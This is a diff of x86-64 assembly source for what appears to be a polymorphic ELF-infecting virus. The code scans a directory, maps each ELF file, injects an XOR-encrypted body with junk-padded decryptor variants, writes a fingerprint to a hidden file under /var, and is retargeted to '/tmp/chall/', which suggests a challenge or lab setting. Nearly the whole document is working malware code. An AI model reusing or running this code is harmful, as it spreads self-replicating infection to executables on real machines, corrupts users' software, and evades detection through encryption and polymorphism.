@@ -91,16 +91,15 @@ _start:
     lea     rdi, [rel infect_dir_1]
     call    _parsing
 
-
 .quit:
     pop     rbp 
     ret
 
 
 _parsing:
-    mov     r15, rdi                   
+    mov     r15, rdi                    
     mov     rax, SYS_OPEN
-    xor     rsi, rsi                    
+    xor     rsi, rsi                  
     syscall
     cmp     rax, -1
     jle     .return_parsing
@@ -126,8 +125,8 @@ _parsing:
     lea     rdi, [rbp - DIRENT_BUF_OFFSET]
     add     rdi, r13
     movzx	r10, word [rdi + 16]        
-   	mov		al,  byte [rdi + r10 - 1]   
-    lea     rsi, [rdi  + 18]           
+   	mov		al,  byte [rdi + r10 - 1]  
+    lea     rsi, [rdi  + 18]            
     add     r13, r10
     cmp     al,  8
     jne     .read_entry_files
@@ -188,10 +187,10 @@ _process_file:
     jl     .close_file
 
 .mmap_file:
-    mov     rsi, [rsi + 48]             
+    mov     rsi, [rsi + 48]            
     mov     [rbp - FILE_SIZE], rsi
-    mov     rdi,  0                    
-    mov     rdx,  0x1 | 0x2           
+    mov     rdi,  0                     
+    mov     rdx,  0x1 | 0x2             
     mov     r10,  0x1                   
     mov     r8,  [r8]                 
     xor     r9,  r9                    
@@ -204,7 +203,7 @@ _process_file:
     mov     [rbx], rax
 
     mov     rbx, [rbx]
-    mov     rdx, 0x00010102464c457f    
+    mov     rdx, 0x00010102464c457f     
     cmp     qword [rbx], rdx
     jne     .ummap_pointer
     call    _infect_binary
@@ -213,7 +212,7 @@ _process_file:
 .ummap_pointer:
     mov     rdi, [rbp - MAPPED_PTR_OFFSET]
     lea     rsi, [rbp - FILE_STAT_OFFSET]
-    mov     rsi, [rsi + 0x40]           
+    mov     rsi, [rsi + 0x40]          
     mov     rax, SYS_MUNMAP
     syscall
 
@@ -226,10 +225,10 @@ _process_file:
 _infect_binary:
     mov     r14, rbx
     mov	    r11, qword [rbx  + 0x18]   
-    movzx   rdx, word [rbx + 0x38]     
-    mov	    rcx, qword [rbx  + 0x20]  
+    movzx   rdx, word [rbx + 0x38]      
+    mov	    rcx, qword [rbx  + 0x20]   
     add     rbx, rcx
-    mov     rax, 0x500000001            
+    mov     rax, 0x500000001           
 
 .segment:
     cmp     rdx, 0
@@ -240,7 +239,7 @@ _infect_binary:
     
 .next_segment:
     dec     rdx
-    add     rbx, 0x38                  
+    add     rbx, 0x38                   
     jmp     .segment
 
 .calculate_space:
@@ -332,7 +331,7 @@ _infect_binary:
     xor     rdx, rdx
     div     r10
     movzx   rcx, byte [rsi]     
-    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
+    xor     cl, byte [rbx + rdx ] 
     mov     byte [rdi], cl
     inc     rsi
     inc     rdi
@@ -346,10 +345,11 @@ _infect_binary:
 
     mov     r8, r9
     sub     r8, r11
-    mov     qword [rdi - 0x8], r8       
+    mov     qword [rdi - 0x8], r8     
+
 
     mov     r8, [rbp - NEW_KEY_OFFSET]
-    mov     qword [rdi - 0x10], r8      
+    mov     qword [rdi - 0x10], r8     
 
     mov     qword [r15 + 0x18], r9
     push    rdi
@@ -367,6 +367,8 @@ _infect_binary:
     mov     qword [rdi - 0x18],r9
     cmp     r9,0x1361
     jl     .patch_fingerprint
+    cmp     r9, 0x1379
+    jg      .patch_fingerprint  
     lea     rdx, [rel index]
     mov     r10, [rdx]
     cmp     r10,0xb2
@@ -383,7 +385,7 @@ _infect_binary:
     mov     r9, 0x10
     sub     r9,rax
     sub     rdi, 0x28
-    lea     rsi, [rbp - BUFFER_FINGERPRINT_OFFSET]         
+    lea     rsi, [rbp - BUFFER_FINGERPRINT_OFFSET]   
     add     rsi,r9
     rep movsb
 
@@ -436,7 +438,7 @@ _generate_fingerprint:
     syscall
     test    rax, rax
     jl     .error
-    mov     rsi, [rsi + 48]             
+    mov     rsi, [rsi + 48]            
     cmp     rsi, 0
     je      .new_fingerprint
 
@@ -476,13 +478,13 @@ _generate_fingerprint:
 
 .done:  
     mov     rax, SYS_FTRUNCATE         
-    mov     rdi, r9                 
-    xor     rsi, rsi                
+    mov     rdi, r9                
+    xor     rsi, rsi               
     syscall
     
 
     mov     rax, SYS_CLOSE            
-    mov     rdi, r9                  
+    mov     rdi, r9                   
     syscall
 
     lea     rdi, [rel tmp]
@@ -491,13 +493,13 @@ _generate_fingerprint:
     syscall
     mov     r9, rax
     mov     rdi, rax
-    mov     rax, SYS_WRITE             
+    mov     rax, SYS_WRITE              
     lea     rsi, [rbp - FINGERPRINT_INT_OFFSET]
     mov     rdx, r10                     
     syscall
 
     mov     rax, SYS_CLOSE            
-    mov     rdi, r9                   
+    mov     rdi, r9                  
     syscall
     pop     rax
     jmp     .return
@@ -516,7 +518,7 @@ _convert_fingerprint_toascii:
     ret
 
 convert_to_ascii_hex:
-    mov     rcx, 16           
+    mov     rcx, 16              
     add     rdi, rcx
     xor     rbx, rbx
     xor     r10,r10
@@ -533,7 +535,7 @@ convert_to_ascii_hex:
 
 .convert_digit:
     add     dl, '0'              
-    mov     [rdi], dl           
+    mov     [rdi], dl            
     inc     r10
     test    rax, rax             
     jnz     .convert_loop_hex
@@ -546,7 +548,7 @@ _generate_key:
     xor     rdx, rdx
     div     r8
     xor     rax, rax
-    mov     al,byte [rbx + rdx] ; key_pattern[i % 36]
+    mov     al,byte [rbx + rdx] 
     mov     byte [rcx], al
     inc     rcx
     inc     rsi
@@ -565,7 +567,7 @@ _decryptor_1:
     push    r11
     movzx   rcx, byte [rsi]     
     nop
-    xor     cl, byte [rbx + rdx] ; key[i % 8)]
+    xor     cl, byte [rbx + rdx] 
     mov     byte [rdi], cl
     nop
     inc     rsi
@@ -574,7 +576,7 @@ _decryptor_1:
     pop     r11
     nop
     inc     r11
-    cmp     r11, 0x711
+    cmp     r11, 0x71b
     je      .return
     jmp     r12
 
@@ -589,7 +591,7 @@ _decryptor_2:
     div     r10
     nop
     movzx   rcx, byte [rsi]     
-    xor     cl, byte [rbx + rdx] ; key[i % 8)]
+    xor     cl, byte [rbx + rdx]
     mov     byte [rdi], cl
     inc     rsi
     nop
@@ -598,7 +600,7 @@ _decryptor_2:
     xor     rax,rax
     shr     rax,3
     nop
-    cmp     r11, 0x711
+    cmp     r11, 0x71b
     je      .return
     jmp     r12
 .return:
@@ -609,7 +611,7 @@ _decryptor_3:
     xor     rdx, rdx
     div     r10
     movzx   rcx, byte [rsi]     
-    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
+    xor     cl, byte [rbx + rdx ]
     mov     byte [rdi], cl
     mov     r13, rsi
     xor     r13, rdi
@@ -618,15 +620,13 @@ _decryptor_3:
     nop
     inc     r11
     shl     rax, 3
-    cmp     r11, 0x711
+    cmp     r11, 0x71b
     je      .return
     jmp     r12
 .return:
     ret
 
-
-
-infect_dir_1    db  "/tmp/test/", 0
+infect_dir_1    db  "/tmp/chall/", 0
 key_pattern     db   "abcdefjhijklmnopqrstuvwxyz0123456789",0
 tmp             db  "/var/.x1ee9w",0
 index           dq  0x0
